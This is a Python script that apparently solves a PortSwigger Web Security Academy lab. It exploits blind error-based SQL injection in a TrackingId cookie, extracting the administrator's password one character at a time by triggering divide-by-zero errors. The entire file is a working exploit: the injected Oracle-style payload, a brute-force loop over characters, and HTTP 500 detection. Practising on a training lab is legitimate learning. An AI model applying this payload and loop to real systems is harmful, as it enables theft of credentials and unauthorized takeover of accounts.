import requests

url = 'https://0a2700ac04ea851980c3080800530070.web-security-academy.net/filter?category=Gifts'
ans = ""
chars = [
    'a','b','c','d','e','f','g','h','i','j','k','l','m',
    'n','o','p','q','r','s','t','u','v','w','x','y','z',
    'A','B','C','D','E','F','G','H','I','J','K','L','M',
    'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    '0','1','2','3','4','5','6','7','8','9',
    '!','"','#','$','%','&','\'','(',')','*','+',',','-','.',
    '/',':',';','<','=','>','?','@','[','\\',']','^','_','`',
    '{','|','}','~'
]

session_cookie = "pCppyt3UcmKbKFNeBxN0jrD0fh4pMKCV"

for c1 in range(6, 21):  # Changed to 21 to ensure we get all characters
    found = False
    for c2 in chars:
        # Construct the cookie value correctly
        tracking_value = f"PXQj9ADjbKsMNIm4'||(SELECT CASE WHEN SUBSTR(password,{c1},1)='{c2}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        
        cookies = {
            "TrackingId": tracking_value,
            "session": session_cookie
        }
        
        try:
            r = requests.get(url, cookies=cookies, timeout=10)
            
            if r.status_code == 500:
                print(f"Success! Character {c1} is: {c2}")
                ans += c2
                found = True
                break
            elif r.status_code == 200:
                print(f"Testing {c1},{c2}: Status 200 - not found")
                
        except requests.exceptions.RequestException as e:
            print(f"Error for {c1},{c2}: {e}")
    
    if not found:
        print(f"No character found for position {c1}, stopping")
        break

print(f"\nFinal password: {ans}")
